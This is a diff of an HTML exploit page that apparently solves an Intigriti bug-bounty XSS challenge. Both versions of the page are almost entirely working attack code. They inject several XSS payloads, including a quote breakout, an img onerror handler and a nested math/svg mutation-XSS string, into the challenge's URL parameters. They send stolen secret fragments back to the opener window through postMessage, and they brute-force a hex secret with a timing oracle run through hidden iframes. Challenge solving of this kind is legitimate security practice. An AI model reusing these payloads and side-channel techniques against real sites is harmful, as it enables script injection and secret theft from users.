@@ -1,71 +1,95 @@
 <!DOCTYPE html>
-<html>
-<head><title>Win a Prize!</title></head>
-<body>
-<h1>🎁 Click to claim your reward!</h1>
-<button id="go" style="padding:20px;font-size:20px;cursor:pointer;">🎉 Claim Reward</button>
-<pre id="log" style="margin-top:20px;padding:10px;background:#000;color:#0f0;font-family:monospace;"></pre>
+<html><head><title>Click Me</title></head><body>
+<button onclick="go()">Click Here</button>
+<pre id="log"></pre>
 <script>
-const log = m => document.getElementById('log').textContent += m + '\n';
+const log=m=>document.getElementById('log').textContent+=m+'\n';
+let popup,c={};
 
-let chunks = {};
-window.addEventListener('message', e => {
-    if (!e.data) return;
+window.addEventListener('message',e=>{
+    if(!e.data)return;
+    log(JSON.stringify(e.data));
     
-    // Collect individual chunks
-    if (e.data.p) { chunks.p = e.data.p; log('Power: ' + e.data.p); }
-    if (e.data.mi) { chunks.mi = e.data.mi; log('Mind: ' + e.data.mi); }
-    if (e.data.r) { chunks.r = e.data.r; log('Reality: ' + e.data.r); }
-    if (e.data.sp) { chunks.sp = e.data.sp; log('Space: ' + e.data.sp); }
-    if (e.data.s) { chunks.s = e.data.s; log('Soul: ' + e.data.s); }
-    if (e.data.t) { chunks.t = e.data.t; log('Time: ' + e.data.t); }
+    if(e.data.power)c.power=e.data.power;
+    if(e.data.mind)c.mind=e.data.mind;
+    if(e.data.reality)c.reality=e.data.reality;
+    if(e.data.space)c.space=e.data.space;
+    if(e.data.soul)c.soul=e.data.soul;
+    if(e.data.time)c.time=e.data.time;
     
-    // Check if we have all 6 chunks
-    if (chunks.p && chunks.mi && chunks.r && chunks.sp && chunks.s && chunks.t) {
-        const code = chunks.p + chunks.mi + chunks.r + chunks.sp + chunks.s + chunks.t;
-        log('Full code: ' + code);
-        
-        if (popup && !popup.closed) {
-            popup.postMessage(code + 'alert(document.domain)', '*');
-            log('>>> XSS TRIGGERED <<<');
-        }
+    if(c.power&&c.mind&&c.reality&&c.space&&c.soul&&c.time){
+        const code=c.power+c.mind+c.reality+c.space+c.soul+c.time;
+        log('CODE: '+code);
+        popup.postMessage(code+'alert(document.domain)','*');
+        log('XSS FIRED!');
     }
 });
 
-let popup;
-document.getElementById('go').onclick = () => {
-    // Soul injection extracts chunks from parent iframes
-    const soulInject = '\";' +
-        'setTimeout(()=>{' +
-            'let p="",mi="",r="",t="";' +
-            'parent.document.querySelectorAll("iframe").forEach(f=>{' +
-                'let u=f.src,m;' +
-                'if(m=u.match(/power_stone=([^&]+)/))p=decodeURIComponent(m[1]);' +
-                'if(m=u.match(/mind_stone=([^&]+)/))mi=decodeURIComponent(m[1]);' +
-                'if(m=u.match(/reality_stone=([^&]+)/))r=decodeURIComponent(m[1]);' +
-                'if(m=u.match(/time_stone=([^&]+)/))t=decodeURIComponent(m[1]);' +
-            '});' +
-            'parent.opener.postMessage({p:p,mi:mi,r:r,s:soulStone,t:t},"*");' +
-        '},1000);//';
+function go(){
+    c={};
     
-    // Space injection captures the postMessage chunk
-    const spaceInject = '<svg><animatetransform onbegin="' +
-        'parent.opener._sp=``;' +
-        'addEventListener(`message`,e=>{' +
-            'if(typeof e.data===`string` && e.data.length===8){' +
-                'parent.opener._sp=e.data;' +
-                'parent.opener.postMessage({sp:e.data},`*`)' +
-            '}' +
-        '})">';
+    // SOUL: leaks self + sends entity payload to POWER iframe
+    const soul='";window.top.opener.postMessage({soul:soulStone},"*");'+
+        'setTimeout(()=>{'+
+            'try{'+
+                'let f=window.top.document.querySelector(\'iframe[src*="power"]\');'+
+                'if(f)f.contentWindow.postMessage("&lt;script&gt;window.top.opener.postMessage({power:power_stone_data},\\"*\\")&lt;/script&gt;","*")'+
+            '}catch(e){}'+
+        '},2000);//';
     
-    const url = 'https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced' +
-        '?soul=' + encodeURIComponent(soulInject) +
-        '&space=' + encodeURIComponent(spaceInject);
+    // MIND: breakout via " removal in console.log("${query}")
+    const mind='");window.top.opener.postMessage({mind:mindStone},"*");//';
+    
+    // REALITY: img onerror (DOMPurify allows img, CSP allows inline from CDN context)
+    const reality='<img src=x onerror="window.top.opener.postMessage({reality:decodeURIComponent(document.querySelector(\'textarea\').value)},\'*\')">';
+    
+    // SPACE: Access parent.code directly since iframe is sandboxed but can still postMessage
+    // Actually, let's use a working mXSS payload
+    const space='<form><math><mtext></form><form><mglyph><svg><mtext><style><img src onerror=window.top.opener.postMessage({space:document.getElementById`space`.shadowRoot.querySelector`p`.textContent},`*`)></style></mtext></svg></mglyph></form></mtext></math></form>';
+    
+    const url='https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced'+
+        '?soul='+encodeURIComponent(soul)+
+        '&mind='+encodeURIComponent(mind)+
+        '&reality='+encodeURIComponent(reality)+
+        '&action=console.log'+
+        '&space='+encodeURIComponent(space);
     
     log('Opening...');
-    popup = window.open(url, '_blank', 'width=1000,height=800');
-};
+    popup=window.open(url,'xss','width=1200,height=800');
+    
+    // TIME: timing oracle
+    setTimeout(()=>leakTime(),3000);
+}
+
+async function leakTime(){
+    log('Starting time oracle...');
+    let chunk='';
+    for(let i=0;i<8;i++){
+        let best='0',minT=999999;
+        for(let h=0;h<16;h++){
+            const guess=chunk+h.toString(16);
+            let total=0;
+            for(let trial=0;trial<8;trial++){
+                const start=performance.now();
+                const iframe=document.createElement('iframe');
+                iframe.style.display='none';
+                iframe.src='https://time.challenge-1225.intigriti.io/search?q='+guess+'&t='+Date.now();
+                document.body.appendChild(iframe);
+                await new Promise(r=>{iframe.onload=r;setTimeout(r,1000);});
+                total+=performance.now()-start;
+                document.body.removeChild(iframe);
+                await new Promise(r=>setTimeout(r,50));
+            }
+            const avg=total/8;
+            if(avg<minT){minT=avg;best=h.toString(16);}
+        }
+        chunk+=best;
+        log('Time['+i+']: '+best+' ('+minT.toFixed(0)+'ms)');
+    }
+    c.time=chunk;
+    log('TIME: '+chunk);
+    window.postMessage({time:chunk},'*');
+}
 </script>
-</body>
-</html>
+</body></html>
 
